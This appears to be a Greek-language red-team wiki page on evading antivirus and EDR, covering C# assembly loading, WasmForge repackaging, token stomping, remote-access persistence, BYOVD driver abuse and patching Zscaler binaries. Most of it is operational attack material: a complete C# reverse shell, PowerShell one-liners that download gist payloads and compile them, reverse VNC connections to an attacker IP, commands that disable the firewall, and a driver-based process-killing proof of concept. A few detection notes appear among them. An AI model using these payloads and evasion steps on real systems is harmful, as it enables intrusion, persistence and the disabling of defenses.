Πρόκειται για έγχυση του κακόβουλου post-exploitation κώδικα **στη δική του διεργασία**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Επανασυσκευασία εργαλείων .NET σε WebAssembly με NativeAOT (WasmForge)

Οι συνηθισμένες τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει αντίθετα το υπόστρωμα εκτέλεσης: μεταφέρει ένα C# project στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει το module σε έναν Windows PE host βασισμένο στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, το JIT ή το `dotnet` host του στόχου, επομένως οι κανόνες που βασίζονται αποκλειστικά σε ονόματα managed assemblies, φόρτωση CLR, AMSI ή .NET ETW χάνουν την άμεση ορατότητα. Πρόκειται για τεχνική evasion/συσκευασίας και όχι για παράκαμψη ορίων προνομίων — το guest διατηρεί τα αρχικά δικαιώματα και την παρατηρήσιμη συμπεριφορά του εργαλείου στο OS.<sup>[[44]](#references)[[45]](#references)</sup>

### Δημιουργία ενός C# project

Η προτεινόμενη διαδικασία build είναι μέσω του Docker environment του project, καθώς περιλαμβάνει το .NET 10 SDK, το NativeAOT-LLVM workload, το WASI SDK 24.0, τον linker και τις εξαρτήσεις υπογραφής. Ένα `.csproj` εντοπίζεται αυτόματα· το build με μία εντολή εκτελεί τη μεταφορά, τα patches συμβατότητας, τη μεταγλώττιση WASM, τη δημιουργία του PE και την υπογραφή.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για την αντιμετώπιση προβλημάτων ή την ανασκόπηση κώδικα που έχει δημιουργηθεί, χωρίστε τη διαδικασία σε `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Το build image χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld` για να αποφεύγει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το ενσωματωμένο runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γέφυρα από wasm32 C# σε x64 Win32

Δεν πρόκειται για διαφανή επαναμεταγλώττιση. Το NativeAOT-WASI δεν υποστηρίζει ή τροποποιεί δυνατότητες του BCL που αφορούν τα Windows, ενώ ένας guest wasm32 δεσμεύει συνήθως θέσεις pointer τεσσάρων byte, την ώρα που τα API x64 μπορούν να επιστρέψουν pointers οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα ακόλουθα επίπεδα που δημιουργούνται αυτόματα:<sup>[[44]](#references)</sup>

1. Ένα source patcher διορθώνει σημασιολογικές διαφορές ειδικές για το AOT και ανακατευθύνει κλήσεις που δεν υποστηρίζονται, όπως κλήσεις registry, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες, σε helpers `Wf*`.
2. Ένας P/Invoke scanner δημιουργεί αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με συνδεδεμένα σύμβολα C bridge αντί να φορτώνουν δυναμικά το δηλωμένο DLL μέσα στον guest.
3. Οι pointers που περνούν στον host χρησιμοποιούν `ulong` στην C# και `uint64_t` στην C. Ένας generic dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις πραγματικές θέσεις εξόδου οκτώ byte, των οποίων τα ανώτερα μισά πρέπει να διατηρηθούν. Για τις μη επισημασμένες εξόδους σε μορφή wasm32 χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην αλλοιώσει τα παρακείμενα τέσσερα byte.
4. Ειδικά host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη γενική αποστολή syscall, όπως πρόσβαση στην cache ticket του LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, κίνηση TCP KDC και ερωτήματα LDAP.

Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις host και ορίζει τα bits 2 και 3 (`0xC`), επειδή ο pointer value και το length είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει generic και προωθεί το όνομα του DLL, το όνομα του export, τα ορίσματα και τη μάσκα στο `wf_call_v2`· ο host εκτελεί τη μετάφραση των pointers και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία εστίασης για τον εντοπισμό

Κώδικας που βασίζεται εκτενώς στο Reflection, δυναμική φόρτωση assembly, αυθαίρετα native callbacks και σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM ενδέχεται να εξακολουθούν να απαιτούν patches ανά εργαλείο ή να αποτυγχάνουν εντελώς. Τα γενικά sockets του WASI Preview 2 μπορεί επίσης να καταλήγουν σε no-op stubs, γι' αυτό τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επαληθεύστε κάθε εντολή σε σχέση με ένα native build αντί να υποθέτετε ισοτιμία λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει τα telemetry αντί να καθιστά το payload αόρατο. Ο εντοπισμός μπορεί να εστιάσει σε ένα PE που περιέχει ή υλοποιεί ένα WASM module, σε συμπεριφορά runtime τύπου Wazero, σε ασυνήθιστη κατανομή και αντιγραφή μνήμης host/guest, σε γενική άμεση αποστολή κλήσεων Win32, σε ανωμαλίες υπογραφών και πόρων PE, καθώς και στις κλήσεις API και την κίνηση δικτύου που προκύπτουν. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να θεωρείται απόδειξη ότι μια διεργασία είναι αβλαβής.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελείτε κακόβουλο κώδικα με άλλες γλώσσες, παρέχοντας στον παραβιασμένο υπολογιστή πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου υπολογιστή.

Το αποθετήριο αναφέρει: το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη στατικών signatures**. Οι δοκιμές με τυχαία, μη obfuscated scripts reverse shell σε αυτές τις γλώσσες είχαν επιτυχία.

## Επαναφιλοξενία WebAssembly για αποφυγή στατικής ανάλυσης

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το Token stomping χειραγωγεί το access token ενός προϊόντος ασφάλειας, όπως ένα EDR ή AV. Η μείωση των δικαιωμάτων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, ενώ την εμποδίζει να εκτελεί ενέργειες προνομιακής επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** να αποκτούν handles στα tokens διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτήν την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος, και έπειτα να το χρησιμοποιήσετε για να αναλάβετε τον έλεγχό του και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από το https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH" και, στη συνέχεια, κάντε κλικ στο αρχείο MSI για Windows για να το κατεβάσετε.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο θύμα (απαιτούνται δικαιώματα διαχειριστή): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαραίτητες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).
 

## Προηγμένη αποφυγή εντοπισμού

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή εντοπισμού είναι πολύ περίπλοκο θέμα· μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, επομένως είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα επιχειρήσετε να αποκτήσετε πρόσβαση έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω θερμά να παρακολουθήσετε αυτήν την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο προηγμένων τεχνικών αποφυγής εντοπισμού.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την αποφυγή εντοπισμού σε βάθος.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλαιότερες τεχνικές**

### **Έλεγχος των τμημάτων που το Defender εντοπίζει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και θα το απομονώσει για εσάς.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι** το [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία μέσω ανοιχτού ιστού στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν εκκινείται το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλάξτε τη θύρα telnet (stealth) και απενεργοποιήστε το firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Αντίστροφη σύνδεση**

Ο **attacker** πρέπει να **εκτελέσει μέσα στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμο** να δεχτεί μια αντίστροφη **VNC σύνδεση**. Έπειτα, μέσα στο **victim**: Εκκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη stealth λειτουργία, δεν πρέπει να κάνετε μερικά πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο, αλλιώς θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της python για παράδειγμα κατασκευής injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από τον χώρο του kernel

Το Storm-2603 χρησιμοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoint πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον εκμεταλλεύεται για να εκτελεί προνομιούχες λειτουργίες kernel, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV με Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένος driver**: Το αρχείο που αποθηκεύεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το «System In-Depth Analysis Toolkit» της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει το driver ως **kernel service** και η δεύτερη το εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το user land.
3. **IOCTLs που εκθέτει το driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Εκφόρτωση του driver και κατάργηση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες δυνατότητες hardening.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και δημιουργείτε ειδοποίηση όταν φορτώνεται πρόγραμμα οδήγησης από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν βρίσκεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από user-mode προς προσαρμοσμένα device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector μέσω επιτόπιας τροποποίησης δυαδικών αρχείων

Το **Client Connector** του Zscaler εφαρμόζει τοπικά τους κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (μια boolean τιμή αποστέλλεται στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο αν το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με την **τροποποίηση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που τροποποιείται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε έλεγχος να θεωρείται συμμορφούμενος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμη και χωρίς υπογραφή) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι κατάστασης ασφαλείας εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγες τροποποιήσεις byte.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Ο driver **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντιπαράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς bug αλλοίωσης μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας operator μπορεί αντί γι’ αυτό να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασης και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου Ring-0. Πρόκειται για primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων, και ο driver μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου, αντί να εισαχθεί ένας προφανής driver τρίτου κατασκευαστή.<sup>[[36]](#references)</sup>

### Προετοιμασία του one-shot driver

